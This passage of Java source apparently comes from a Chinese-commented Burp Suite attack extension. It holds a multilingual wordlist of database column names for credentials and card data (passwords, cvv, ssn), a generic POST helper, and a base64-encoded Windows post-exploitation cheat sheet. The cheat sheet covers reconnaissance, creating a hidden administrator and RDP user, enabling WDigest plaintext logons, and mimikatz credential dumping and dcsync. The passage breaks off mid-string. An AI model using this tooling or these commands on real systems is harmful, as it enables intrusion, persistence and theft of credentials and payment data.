storeid#progenitor_id#staff_number#deptid#semester#poi_id#part_id#cell_line_id#transaction_id#agentid#regionid#token#serial_no#experimental_data_set_id#cp_id#the_geom#model#o_id#personid#display_name#salesperson_id#dependent_name#license#tablename#employee_id#e_id#id_group#location#bb#languageid#int4#msg_id#department#book_id#ingredientid#action_type_id#maker#app#id_customer#this#entry_id#county_id#protocol_type_id#empnbr#unit_number#bar#studentid#dbid#title_id#cname#emp_num#owner#course_name#editionnumber#sessionid#mealid#com_id#text#chip_layout_id#watchlistid#qty#data_set_type_id#orderid#module_id#c1#dlocation#domainid#course_no#mgrssn#id_log#access_control_type_id#account_id#checking#protocol_id#request_id#settingsid#lname#sale_date#module_addr#flag#usuario#nombre#contrasena#consumidor#clave#tecla#llave#chaveta#tono#cuna#correo#contrasenia#benutzername#benutzer#passwort#kennwort#parole#losungswort#losung#kennung#motto#stichwort#schlusselwort#utilisateur#usager#consommateur#nom#mot#passe#cle#touche#clef#utente#nome#utilizzatore#parola#chiave#tasto#pulsante#chiavetta#cifrario#usufrutuario#chave#cavilha#korisnik#sifra#lozinka#kljuc#isim#ad#adi#soyisim#soyad#soyadi#kimlik#kimlikno#tckimlikno#tckimlik#yonetici#sil#silinmis#numara#sira#lokasyon#kullanici#kullanici_adi#sifre#giris#pasif#posta#adres#is_adres#ev_adres#is_adresi#ev_adresi#isadresi#isadres#evadresi#evadres#il#ilce#eposta#eposta_adres#epostaadres#eposta_adresi#epostaadresi#e-posta#e-posta_adres#e-postaadres#e-posta_adresi#e-postaadresi#e_posta#e_posta_adres#e_postaadres#e_posta_adresi#e_postaadresi#baglanti#gun#ay#yil#saat#tarih#guncelleme#guncellemetarih#guncelleme_tarih#guncellemetarihi#guncelleme_tarihi#yetki#cinsiyet#ulke#guncel#vergi#vergino#vergi_no#yas#dogum#dogumtarih#dogum_tarih#dogumtarihi#dogum_tarihi#telefon_is#telefon_ev#telefonis#telefonev#ev_telefonu#is_telefonu#ev_telefon#is_telefon#evtelefonu#istelefonu#evtelefon#istelefon#kontak#kontaklar#user#pass#cc_number#emri#fjalekalimi#pwd#customers_email_address#customers_password#user_password#user_pass#admin_user#admin_password#admin_pass#usern#user_n#users#login#logins#login_user#login_admin#login_username#user_username#user_login#auid#apwd#adminid#admin_id#adminuser#adminuserid#admin_userid#adminusername#admin_username#adminname#admin_name#usr#usr_n#usrname#usr_name#usrpass#usr_pass#usrnam#nc#myusername#mail#emni#logohu#punonjes#kpro_user#wp_users#emniplote#perdoruesi#perdorimi#punetoret#logini#llogaria#fjalekalimin#kodi#emer#ime#korisnici#user1#administrator#administrator_name#mem_login#login_password#login_pass#login_passwd#login_pwd#psw#pass1word#pass_word#passw#pass_w#user_passwd#userpass#userpassword#userpwd#user_pwd#useradmin#user_admin#mypassword#passwrd#admin_pwd#admin_passwd#mem_password#memlogin#e_mail#usrn#u_name#uname#mempassword#mem_pass#mem_passwd#mem_pwd#p_word#pword#p_assword#myname#my_username#my_name#my_password#my_email#cvvnumber#about#access#accnt#accnts#account#admin#adminemail#adminlogin#adminmail#admins#aim#auth#authenticate#authentication#blog#cc_expires#cc_owner#cc_type#cfg#clientname#clientpassword#clientusername#config#contact#converge_pass_hash#converge_pass_salt#crack#customers#cvvnumber]#db_database_name#db_hostname#db_password#db_username#download#e-mail#emailaddress#full#group#hash#hashsalt#homepage#icq#icq_number#id_member#images#index#ip_address#last_ip#last_login#login_name#login_pw#loginkey#loginout#logo#md5hash#member#member_id#member_login_key#member_name#memberid#membername#members#new#news#nick#number#nummer#passhash#pass_hash#password_hash#passwordsalt#personal_key#phone#privacy#pw#pwrd#salt#search#secretanswer#secretquestion#serial#session_member_id#session_member_login_key#sesskey#spacer#status#store#store1#store2#store3#store4#table_prefix#temp_pass#temp_password#temppass#temppasword#un#user_email#user_icq#user_ip#user_level#user_passw#user_pw#user_pword#user_pwrd#user_un#user_uname#user_usernm#user_usernun#user_usrnm#userip#userlogin#usernm#userpw#usr2#usrnm#usrs#warez#xar_name#xar_pass#account#accnts#accnt#user_id#members#usrs#usr2#accounts#admin#admins#adminlogin#auth#authenticate#authentication#account#access#customers#customer#config#conf#cfg#hash#login#logout#loginout#log#member#memberid#password#pass_hash#pass#passwd#passw#pword#pwrd#pwd#store#store1#store2#store3#store4#setting#username#name#user#user_name#user_username#uname#user_uname#usern#user_usern#un#user_un#usrnm#user_usrnm#usr#usernm#user_usernm#user_nm#user_password#userpass#user_pass#user_pword#user_passw#user_pwrd#user_pwd#user_passwd#fld_id#fld_username#fld_password#loginname#pasword#permission#perm#user_group#tendn#tendangnhap#tenquantri#tenquanly#tennguoidung#ten#tennd#nguoidung#nguoidungid#quantri#quanly#u_id#accountname#account_name#matkhau#matma#paswd#pas#tukhoa#login_pas#loginpassword#loginpasswd#loginpass#loginpas#loginpwd#secret#secret_code#secretcode#administrators#adminpass#adminpassword#adminpaw#adminpwd#adminuid#upass#level#mima#sb_admin_name#sb_pwd#client#clients#ipaddress#files#family#admin_psw#administrateur#adminpsw#adminupass#adress#aide#articleid#content#dw#feed#feedback#glmm#isadmin#key#keywords#mpassword#msn#musername#newsid#numer#passer#pe_aduser#pe_user#power#pswd#pwd1#qq#stocker#sysuser#telephone#texte#userpasswd#usr_nusr#usr_pw#website#wind#compte#comptes#objectif#authentifier#authentification#fissure#adressee-mail#complet#groupe#hachage#connexion#membre#membres#mm#p#u#mot_de_passe_bdd#mon_mot_de_passe#monmotdepasse#ignatiusj#caroline-du-nord#nouveau#sel#recherche#utilisateurs#o#konto#rachunki#administratorzy#pomoc#cel#uwierzytelnienia#uwierzytelnianie#kontakt#klient#danych#adres_e-mailowy#grupy#obrazy#spis#dostawcy#nazwisko#zaloguj#nowy#telefon#seryjny#ustawienie#kod#stan#sklep1#sklep2#tekst#zytk#konta#rysa#adrese-mail#ecolo#tat#yh#yhm#yhmm#yonghu#content_id#codigo#geometry#published#section_value#tidcliente#menuid#pollid#bid#moduleid#gab_pergunta#tipo#template#multilinestring#aal_aluno#ava_professor#adm_nivel#lec_codigo#per_codigo#lec_disciplina#gaip_codigo#acl_id#niv_codigo#quantidade#attribute_id#gaia_codigo#alu_matricula#nota#gab_codigo#field_id#ava_codigo#aal_codigo#message_id#avi_codigo#fre_disciplina#groups_id#nome_cliente#pc#lec_professor#idusuario#poll_id#dis_codigo#ava_disciplina#gap_codigo#avp_codigo#aai_codigo#fre_aluno#fre_codigo#adm_id#id_estado#aap_codigo#pro_matricula#gp#xlancamento#municipioprestador#product_price_id#country_2_code#shopper_group_id#manufacturer_id#com_natur#review_id#xtipo_de_acao#bookmark_id#xequipe_padrao#faixas_id#xcliente#deducoes_id#xcategoria#xencerramento#idx_item#xcadastro#quantitens#additional_htmlblob_users_id#ipi#xfase_de_vencimento#permission_id#xdecisao#i_end#xforo#order_item_id#mo#grafica_id#news_id#enderecos_id#desccompensa#desconto#creditcard_id#card_id#cardid#idcard#creditcard#cardnumber#cardno#itens_id#senha#order_status_id#id_seq#municipio_id#additional_users_id#order_status_history_id#function_id#controladas_id#ator_id#shipping_rate_id#htmlblob_id#css_id#xfase#fieldvalueid#main#correcaostrategy_id#fonte#xmetodo_atualizacao#desd_xdecisao#jurosstrategy_id#fielddef_id#especie_id#idcategoria#xgrupo#indice_id#xprocedimento#xcustom1#autor_id#newssummarycategory#icmsinterno#nonnavigable#domicilio_id#notafiscal_id#userplugin_id#shipping_carrier_id#municipiotomador#natureza#solicitante_id#mbpp#xcustom2#template_id#chave_primaria#desd_xforo#payment_method_id#nome_agencia#pessoa_id#uprdescricao#export_id#logo_id#prazo_xevento#tomador_id#serie_id#tidclasfiscais#atividades_id#logradouro_id#xadvogado#xequipe#handler_id#xobjeto#multipolygon#tipo_id#xproprietario#state_id#mopc#valorcontabil#xprocesso#coupon_id#currency_id#parameter_name#contribuinte_id#xcubo#country_id#id_fatura#serienfe_id#tax_rate_id#waiting_list_id#download_id#emissao#screen#xcustom3#mbpc#documento_id#xcustom4#fieldid#point#xsituacao#icmssp#tidproduto#pp#empresa_id#i_tel#contador_id#telefones_id#estado_id#xevento#site#order_currency#xprocesso_apensado#multastrategy_id#saida#grupo_id#guid_sessao#indice#xjurisdicao#news_category_id#mf_category_id#product_type_id#xusuario#vendor_id#sitepref_name#desd_xjurisdicao#option_id#xrelatorio#codusuario#id_cidade#user_info_id#desd_xfase#situacao#file_id#zone_id#id_servico#situacao_id#tidfornecedor#valor2#valor3#valor4#valor5#origem#few#idxatv#mopp#prestador_id#xprognostico#xclasse#log_id#xadverso#guid_email#guiaavulsa_id#pl#vendor_category_id#venc3#venc2#totpc#venc5#venc4#xserie#order_info_id#an#totpp#totpv#imagen_id#esquema#atividade_id#xgarantia#discount_id#xnatureza#group_perm_id#category_child_id#newssummaryauthor#and_xevento#rolle_nr#standort_nr#ja#persnr#vorname#width#titel#filename#post_id#swidth#height#vorgaenger#matrnr#kursnr#notification_type#sheight#style_id#startnummer#bezeichnung#basename#kat_id#whabfragen#struct_id#havabfragen#abfrsql#vorlnr#ban_id#forum_id#rank_id#nr#k_id#nachname#ort#key_id#groesse#datum#image_id#entry#speise_id#word_id#absatz_id#class_id#mail_id#zid#ticket_id#queue_id#pid1#pid2#currval#forum#organizationid#institute_id#history_id#my#how#after#meetingid#mitarbeiterid#idgruppe#re#artikel_id#top#perid#pers_nr#idstelle#messageid#acctid#address_book_id#article_id#com#kid#rule_id#kosten#plz#confirm_id#race_id#vis_id#descr#seitelayout_id#vote_id#g_id#activated#show#guy#vtyp_id#timeofmove#views#meta_id#blz#bookid#teilnehmernr#weaponid#region_id#resultid#calendar#address_id#pos#d_id#serverid#cd#answer_id#categories_id#start#site_id#price_id#az#mnr#cis_id#config_key#address_format_id#tn#tax_id#mountname#standard#schweiz#partner_id#idkontakt#eventid#oldstate#topicid#sonst#pk#mountcategory#von#orders_recalculate_id#block_id#knr#msgid#ortnr#seiteabs_id#id1#um#paperid#send#wid#gi#lieferant#orgid#profile#zugang#allow#unique_id#taskid#configuration_id#jcode#ex_id#blog_id#who#section_id#mindk#beschreibung#schl#you#object_link_a_id#disallow_id#strasse#option_name#q_trid#summary_id#gameid#catid#dni#prune_id#anid#linkid#qid#word_text#id_cat#eid#privmsgs_text_id#downloadid#hid#themes_id#privmsgs_id#codi#requestid#ratingdbid#edad#secid#sitename#artid#gallid#main_module#contactid#aro_id#replace#total#root#prodid#id_paciente#mosloadposition#de#mossef#ordid#stdprice#advanced#super#editor#rol#editors#mosvote#agent#en#searchbot#cod_aplicacion#manager#geshi#author#coste#mos#menutype#session_ip#publisher#texto#actor_id#mosemailcloak#none#id_tra#sistema#help#custid#value_id#nompuerto#legacybots#id_enfermedad#tinymce#nivel#locale#load#format#registered#moscode#results#search_term#mosimage#sin#mospaging#que#sef#dorsal#coste_total#legacy#btn#repid#parent_id#time_stamp#bannerid#numero#id_auteur#titre#lang#tag#id_forum#id_groupe#id_article#alliance1#alliance2#id_message#num#fichier#id_user#id_syndic#dico#id_rubrique#id_document#id_breve#id_signature#id_type#ide#id_syndic_article#id_mot#n_agence#ville#codepostal#sess_id#num1#constraint_name#n_type#theme_id#image#referer_md5#id_fragment#new_id#version_min#liste#id_version#prix#terms_body#prenom#nid#n_client#n_compte#apid#n_dept#n_dir#age#dt_id#subdivision_id#sub_class_id#comments#cmtid#tags#checkbox#ct_id#part#lastupdated#customsettings#catalogue_id#relationmessage#englishname#ba_num_reads#at_id#bs_setting#am_id#t2#t1#message#blogcommentsaccess_id#sub_class#grfilt#tempprovkredit#ostdate#koef#bms_cat_id#bd_id#field2#field3#dd#kredit#callend#gcode#blogcommentsaccess#sender#udal#bcf_id#bfs_id#schet#grcode#blogcommentssub#blogpermissiongroup_id#us_id#bv_id#bvo_id#rusname#gbid#kontr600#realiz_opt#bs_bid#bb_id#bf_id#wuser#v_id#sklad#sd#object_sub_class_id#callstart#myexec#relationsub#id_photo#bfl_id#bml_id#blogmessagesaccess#bn_id#bsu_id#id_links#bo_id#dates#kontr620#pom#object_parent_id#ostatki#tovar#oid#bsm_id#mn_id#pcode#id_poll_ip#groupcodes#codeid#fot_id#spell_id#typenamekeeper#bt_id#odate#bdate#bs_id#id_paragraph#t4#t3#nt_id#id_contact#korschet#data_in#id_msg#bc_plugin#summaprihod#boe_c_id#bct_id#grkntr#btt_id#string#tl_id#subdivision_name#bc_id#bfp_id#bcfs_id#vcode#id_refferer#ssschet#sessid#im_id#id_poll#ba_num_voted#kontr60#id_ip#kre1#ord_id#kc#bbt_id#bst_id#bftt_id#blogpermissiongroup#it_id#chost#bo_order_number#ba_id#object_sub_id#hidden_url#bms_id#pnds#pt_id#realiz#id_catalog#wdate#bff_id#matcode#bur_cat_id#bsl_id#blogmessagesaccess_id#bcena#ostatkii#ost1#bvr_id#prih#bu_id#bp_id#isview#id_artpage#tb_id#bst_time#ba_order_num#username1#id_answer#rt_id#bot_id#korschetfilter#st_id#summachp#vt_id#data_out#journals#enumtypid#scriptname#result#bsur_id#keyname#handle#ba_date#blogcommentscc#lg_id#bft_id#ft_id#toorg#debet#orgcode#partstring#id_product#bte_id#pu_id#mt_id#edate#community#bpe_id#grtov#id_page#boe_id#sut_id#task_id#object#can#voteid#operation_id#city_id#list#page_id#banner_id#error#language_id#val#dealer_id#modify_date#regist_date#comment#payment_method#service_name#file1#rel_id#sub_large_image3#sub_image6#sub_image4#sub_image5#sub_image3#sub_image1#fix#companyid#formid#charge#page_name#deliv_fee#category_name#stock_unlimited#sale_limit#nam#target_id#tempid#point_rate#payment_image#confirm_url#dt#document_id#productid#ken_kanji#attname#parent_category_id#module_name#main_list_image#create_date#conkey#product_code#price01#price02#classcategory_id1#seminer_id#classcategory_id2#newrow#update_date#classcategory_id#yeartag#job#relname#comm#main_large_image#sub_image2#deliv_id#idx#comment5#bloc_row#ndc#comment6#comment1#comment3#comment2#creator_id#bloc_name#equip_id#recommend_product_id#file3#file2#jiscode#file6#file5#file4#news_date#rank#sub_title5#sub_title4#sub_title6#sub_title1#sub_title3#sub_title2#txt#loc#fee#committee_id#module_code#pref#disp_name#pref_id#deliv_date_id#relid#upper_rule#main_image#umeta_id#template_code#edit_flg#comment4#kiyaku_title#hiredate#csv_id#sal#attrelid#deptname#main_comment#sub_large_image4#sub_large_image5#sub_large_image6#php_dir#sub_large_image1#sub_large_image2#bloc_id#test#tpl_dir#del_flg#stock#sale_unlimited#sub_comment4#sub_comment5#sub_comment6#manuscriptid#sub_comment1#sub_comment2#sub_comment3#main_list_comment#mgr#product_flag#rule#c_commu_topic_id#c_diary_comment_log_id#idcomune#idruolo#idtrattamento#idpaziente#matricola#idpersonale#idasl#idanagrafica#idciclo#iddocumento#idservizio#idricovero#idclinica#idcamera#idtipociclo#idsistemazione#idtiporicovero#idtiposervizio#idsesso#idpagamento#idtipodimissione#idletto#iddescrizionedocumento#codice#cognome#idtipodocumento#idstatocivile#idtipologiaservizio#idtipotrattamento#idmedicofamiglia#idregistro#idreparto#iddistretto#idprovenienza#telefono#eta#figlio#reddito#denominazione#anno#idbocca#idcartellaclinica#idsistnerv#idappargenit#idtipotrasferimento#dataricovero#idcuore#cap#descrizione#idocchi#sede#idricoverohatipologia#noteaccettazione#dal#datadimissione#idorecchie#idcorpo#id_provincia#idtipologiaricovero#id_regione#idapparlocom#idcomuneresidenza#created_at#datanascita#corso#idanamnesifamil#idesameobiettivo#idcapo#idsmaglog#sesso#impiegato#luogonascita#idcute#idcollo#idsistresp#dipsede#cellulare#idaddome#php#idnaso#cf#idstatogenerale#idtrasferimento#indirizzo#genitore#dipnome#updated_at#idlinfonodi#groupname#shop#c_name#plugin_googlemap2#jfalternative#post_status#localita#prz_merce_fis#idgroupacl#comune#ana_codice#utenteid#mod_gtranslate#idlocation#rating_id#online_id#jfsections#idextra#categories#luogoid#nroordine#stat_name#gender#oggettistica#gru_userid#pv_id#parigi#direct#pm_id#idperiodo#idarticolo#what#can_codice#sub#id_nazione#client_name#acc_codice#mod_freeway_services#cleanurl#newyork#idcategory#active#box#prc_sconto1#prc_sconto3#prc_sconto4#disma#iddiscipline#job_e_date#risultato#mod_arcadebtn#jfrouter#apply#unit#newcollection#customenu#prova#cod_utente_mod#helvetica#send_id#mf_desc#nroarticolo#mod_ninja_simple_icons#sessione#cdele#statoattivitaid#bracciali#zenzaro#cod_valuta#collane#tabella#newyorkenglish#grp_id#var_id#sot_proposta_e#virtuemart#enteid#rpad#auth_id#realname#attivitaid#readmore#freewaylogin#idconfig#pin#pins#csc#cvd#cvv#cvv2#cvvc#ccv#ccid#qta_merce#charms#diritto#accessori#mod_signallogin#remember#mod_virtuemart_featureprod#padre#prc_sconto2#enter#idgara#morfeoshow#lingua#piede#gtranslate#under_menu#id_disciplina#nomedip#before#mod_virtuemart_search#arial#job_id#config_item#add_date#jfdatabase#madre#idragsoc#idsubscriptiontickets#loadmodule#jumpmenu#idsocieta#category_img#portachiavi#mf_name#codicepaziente#mod_virtuemart_randomprod#ninja#pro_codice#mod_vm_cat_menu_specific#vinod#newsfeeds#id_palestra#mod_custom#css#debug#side#dipart#areainterventoid#mod_flashmod#tipologiaenteid#emailcloak#mod_freeway_events#id_logho#codicemedico#nuova#catarticles#dst#gru_codice#idutente#idutenti#job_title#schedaid#idmlattach#zonainterventoid#totfasciaeuroid#structure_id#att_codice#blogger#plan_table_output#pagenavigation#idplugin#vote#mod_freeway_subscriptions#idconn#cerca#system#langkey#app_gruppo_e#term_taxonomy_id#statement#params#oggetto#mod_cpmfetch#signallogin#id_passwd#codrappr#coddoc#statoavanzamid#nrsez#idmlgroup#rated_id#kwick#id_citta#prc_magg1#prc_magg2#flg_fiscale#banner_url#attribute_sku_id#mod_product_list#end_date_time#purchase_id#client_url#vm_manufacturer_category#pfs_id#veteran#mod_cd_login#menu_selezione#ruoloenteid#ele_codice#pl_id#payment#idmlmail#mod_virtuemart_currencies#freeway#annoid#cod_dep#area_id#prg_art#alias_area_id#sent#po_id#yoologin#sys_context#mod_enugene#idnotsentmails#mod_virtuemart_manufacturers#menu#cache#prg_movimento_riga#url_md5#ldap#tvoti#villiam#full_news#yoocarousel#main2#main3#dat_utente_mod#user_alto#pff_id#smilie_id#mod_date#banner#pinsn#codice_comune#vm_payment_method#idclassificatore#idgroup#progetto#mod_freeway_shoppingcart#payment_extrainfo#cost_id#gmail#dat_movimento#mod_jt_slideshow#campo_bol#idcliente#prz_merce#hdesc#fp_id#jt#idfile#ji#mod_catarticles#mod_virtuemart_latestprod#mod_customenu#app_utente_e#prg_movimento#include_date#cod#flipper#naresh#cache_language_id#id_preventivo#config_owner#header#mootoolnicemenu#qualificareferenteid#modhome#id_annuncio#idtitolo#source#charmsn#swf#tutor#mod_yoo_carousel#portachiavin#idevent#mod_mainmenu#jfcontent#item_cd#tpref#id_news#mf_category_name#iddesign#moduledir#cod_clifor#fkidannofdr#mod_donimedia_select_box_menu_type1#jfcontacts#jpg#client_desc#mod_freewaylogin#mod_translate#flscrvpre#grand#mf_category_desc#payment_method_name#extended#mod_vm_prod_cat_full#mod_freeway_admin#orecchini#nlista#jfcategories#mod_cssmenu#mod_lxmenu#mod_flipper_img_rotator#fkidanagrafica#id_comune#statement_id#idatleta#inactive#mod_sidebarmenuapplestyle#candidato#ref_url#testq#ind_clifor#xmlrpc#pingback_id#l_col_list#fs_id#press#mod_freeway_products#semo#bijoux#rakesh#modulo_contatti#google#vm_manufacturer#vot_proposta_e#brend#post_date#enugene#nrcandi#invoice#home#sot_utente_e#settoreid#weblinks#contacts#id2#codcliente#news_title#job_s_date#sql_text#affiliate#backlink#core#id_attivita#index_num#etertre#manufacturer#cod_utente_cre#cod_art#ideventcategory#dat_utente_cre#cache_id#joomla#product_list#coupon#mod_sendcart#bijouxn#pagebreak#idsessione#arcade#mod_virtuemart_topten#banner_title#flg_prezzo_con_iva#partnerid#vot_utente_e#sections#xstandard#id_scheda#vm_category#mod_jumplink#exclude_date#ruoloid#contenuti#accessorin#coppermine#banlist_id#offerte#idticket#idsubscription#beneficiarioid#oggettistican#jfnewsfeeds#anelli#ship#imenu#na#nb#get_ddl#short_news#openid#titoloprogettoid#connection_id#mod_kwick_sliding_menu#matr#id_richiesta#idoggetto#lxmenu#text_id#user_basso#ver_codice#mayank#idgrouppermission#modules#client_img#does_repeat#typeid#cronid#advid#admingid#payid#tagname#optionid#templateid#applyid#searchid#styleid#medalid#pluginvarid#fldfuntype#fldfunindex#displayorder#pluginid#fldfunopen#fldfunid#fldfunhref#fldfunmemo#fldfunname#mobile#invisible#polloptionid#cachename#tagid#pluginhookid#pmid#fldfuninfo#magicid#keyid#areaid#logid#folder#allno#vieworder#classid#topped#msg#topics#rankid#timeid#iconid#intro#corpid#replies#operation#announceid#nickname#goods_id#attachment#special#hk_name#stylevarid#posterid#curtopics#allowbanip#hide#allowdelpost#db_value#picurl#yahoo#adid#digest#n_id#hidden#olimg#lastpost#signature#lastposttime#doid#authstr#tabid#org_code#typename#allowstickthread#departmentid#allowmassprune#identify#old#avatar#allowedituser#forumname#descrip#blogid#allowmoduser#lastposterid#today#tempfidlist#feedid#courseid#olid#hk_value#xh#allowpostannounce#copy#splitstring#icon#fidlist#lastpostpmtime#article#former#projectid#avatarheight#html#alloweditpoll#downloads#channelid#allowbanuser#appid#allowcensorword#emailid#lastexecuted#decl_mail#lastupdatetime#billid#vid#lastposter#allowrefund#allowviewrealname#installed#lasttid#postcount#searchstring#reason#customstatus#titleid#newpms#verifycode#forumid#attention#readperm#skype#lastsearchtime#bio#lastpostid#idcard#postdatetime#question#poster#sightml#highlight#pageid#threadorder#todaycount#currentindex#avatarwidth#magic#allowmodpost#allowviewip#pro_id#iid#decrip#alloweditpost#mailid#lastforumposterid#accountid#tids#medals#fileid#postid#closed#lastactivity#newnotices#allowviewlog#expiration#layer#ishtml#command#brand_id#disablepostctrl#fieldname#ajar#akses#aktif#akun#alamat#batas#cabang#deskripsi#foto#harga#hp#jeda#jenis#jml#judul#jumlah#kata_kunci#kata_sandi#katakunci#katasandi#kategori#kelas#keterangan#kode#kunci#lahir#nama#nama_akun#nama_ibu_kandung#nama_pengguna#namaakun#namapengguna#pekerjaan#pendidikan#pengguna#penjelasan#perusahaan#ponsel#profesi#ruang#sandi#soal#surat_elektronik#surel#tanggal#tanggal_lahir#telepon#tempat#tempat_lahir#tmp_lahir#universitas#urut#waktu#cookie#login_count#credit#card#pin#cvv#pan#password#social#ssn#account#confidential#u_pass#hashedPw";
        data = data.replace("#","\n");
        return data;
    }

    // base64解密 用来解决中文乱码问题
    public String base64_decode(String s) {
        String result = null;
        try {
            result = new String(helpers.base64Decode(s), "utf-8");
        }catch (Exception e){
            e.printStackTrace();
        }

        return result;
    }
    //post请求
    public static String sendPost(String url, String param) {
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url);
            // 打开和URL之间的连接
            URLConnection conn = realUrl.openConnection();
            // 设置通用的请求属性
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            // 发送POST请求必须设置如下两行
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(3000);
            // 获取URLConnection对象对应的输出流
            out = new PrintWriter(conn.getOutputStream());
            // 发送请求参数
            out.print(param);
            // flush输出流的缓冲
            out.flush();
            // 定义BufferedReader输入流来读取URL的响应
            in = new BufferedReader(
                    new InputStreamReader(conn.getInputStream(),"UTF-8"));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！"+e);
            e.printStackTrace();
            result = "发送请求出现异常！";
        }
        //使用finally块来关闭输出流、输入流
        finally{
            try{
                if(out!=null){
                    out.close();
                }
                if(in!=null){
                    in.close();
                }
            }
            catch(IOException ex){
                ex.printStackTrace();
            }
        }
        return result;
    }

    //windows命令收集
    private String windows_command(){
        String data = "6K+35omn6KGM5ZyoY21k5Lit5omn6KGM5ZG95Luk77yadGFza2xpc3QgL3N2YwrovpPlh7rnmoTnu5PmnpzotLTliLDlt6bovrnmn6Xor6IKCndpbmRvd3Plkb3ku6TmlLbpm4YK5L+h5oGv5pS26ZuGOgoK5p+l55yL57O757uf54mI5pys5ZKM6KGl5LiB5L+h5oGvOiBzeXN0ZW1pbmZvCuafpeeci+ezu+e7n+W8gOaUvuerr+WPozogbmV0c3RhdCAtYW5vCuafpeeci+ezu+e7n+i/m+eoizogdGFza2xpc3QgL3N2YwrliJflh7ror6bnu4bov5vnqIs6IHRhc2tsaXN0IC9WIC9GTyBDU1YK5p+l55yLaXDlnLDlnYDlkoxkbnPkv6Hmga86IGlwY29uZmlnIC9hbGwK5p+l55yL5b2T5YmN55So5oi3OiB3aG9hbWkgL3VzZXIK5p+l55yL6K6h566X5py655So5oi35YiX6KGoOiBuZXQgdXNlcgrmn6XnnIvorqHnrpfmnLrnlKjmiLfnu4TliJfooag6IG5ldCBsb2NhbGdyb3VwCuafpeeci+W9k+WJjeeZu+mZhueUqOaItzogcXVlcnkgdXNlcgrmn6XnnIvlvZPliY3nlKjmiLfkv53lrZjnmoTlh63or4E6IGNtZGtleSAvbGlzdArmn6XnnIvot6/nlLHkv6Hmga86IHJvdXRlIHByaW50Cuafpeeci2FycDogYXJwIC1hCuafpeeci+W9k+WJjeeUqOaIt+S/neWtmOeahOelqOaNruWHreivgToga2xpc3QK5pCc57SiROebmOejgeebmOWQjeWtl+S4umxvZ28uanBn55qE5paH5Lu2OiBjZCAvZCBEOlwgJiYgZGlyIC9iIC9zIGxvZ28uanBnCuaQnOe0oEPnm5jmlofku7blpLnkuIvlkI7nvIBjb25m5YaF5a655pyJcGFzc3dvcmQ6IGZpbmRzdHIgL3MgL2kgL24gL2Q6QzpcICJwYXNzd29yZCIgKi5jb25mCuafpeecizMzODnnq6/lj6M6IGZvciAvZiAidG9rZW5zPTIiICVpIGluICgndGFza2xpc3QgL0ZJICJTRVJWSUNFUyBlcSBUZXJtU2VydmljZSIgL05IJykgZG8gbmV0c3RhdCAtYW5vIHwgZmluZHN0ciAlaSB8IGZpbmRzdHIgTElTVEVOSU5HCldpbuiuvue9rue7iOerr+S7o+eQhjogc2V0IGh0dHBfcHJveHk9aHR0cDovLzEyNy4wLjAuMTo3ODkwICYgc2V0IGh0dHBzX3Byb3h5PWh0dHA6Ly8xMjcuMC4wLjE6Nzg5MAoK5re75Yqg55So5oi3OgoK5re75Yqg55So5oi35bm26K6+572u5a+G56CBOiBuZXQgdXNlciB0b29scyAxMjM0NTYgL2FkZArlsIbnlKjmiLfliqDlhaXnrqHnkIbnu4Q6IG5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3JzIHRvb2xzIC9hZGQK5bCG55So5oi35Yqg5YWl5qGM6Z2i57uEOiBuZXQgbG9jYWxncm91cCAiUmVtb3RlIERlc2t0b3AgVXNlcnMiIHRvb2xzIC9hZGQK5r+A5rS7Z3Vlc3TnlKjmiLc6IG5ldCB1c2VyIGd1ZXN0IC9hY3RpdmU6eWVzCuabtOaUuWd1ZXN055So5oi355qE5a+G56CBOiBuZXQgdXNlciBndWVzdCAxMjM0NTYK5bCG55So5oi35Yqg5YWl566h55CG57uEOiBuZXQgbG9jYWxnb3VwIGFkbWluaXN0cmF0b3JzIGd1ZXN0IC9hZGQKCuazqOWGjOihqOebuOWFszoKCuafpeecizMzODnnq6/lj6MgOiBSRUcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyXFdpblN0YXRpb25zXFJEUC1UY3AiIC92IFBvcnROdW1iZXIK5byA5ZCv6L+c56iL5qGM6Z2iIDogUkVHIEFERCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIiAiU2VydmVyIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZgrms6jlhozooajmipPlj5bmmI7mloc6IFJFRyBBREQgSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1xXRGlnZXN0IC92IFVzZUxvZ29uQ3JlZGVudGlhbCAvdCBSRUdfRFdPUkQgL2QgMSAvZgpyZHDov57mjqXpu5jorqTnmoQxMOS4quiusOW9lTogcmVnIHF1ZXJ5ICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0IgpyZHDov57mjqXpu5jorqTnmoTmiYDmnInorrDlvZU6IHJlZyBxdWVyeSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycyIgL3MK5p+l5om+6L2v5Lu25a6J6KOF55uu5b2VOiByZWcgcXVlcnkgSEtMTSAvZiBmb3htYWlsIC90IFJFR19TWiAvcwoK5bel5YW355So5rOV5ZG95LukOgoKbWltaWthdHrmn6XnnIvlvZPliY3lr4bnoIE6IG1pbWlrYXR6ICJsb2ciICJwcml2aWxlZ2U6ZGVidWciICJzZWt1cmxzYTpsb2dvbnBhc3N3b3JkcyIgImV4aXQiCm1pbWlrYXR65oqT5Y+WZG9tYWlu5a+G56CBOiBtaW1pa2F0eiAibHNhZHVtcDo6ZGNzeW5jIC9kb21haW46dGVzdC5jb20gL2FsbCAvY3N2IiAiZXhpdCIKcmVn5a+85Ye65rOo5YaM6KGoaGFza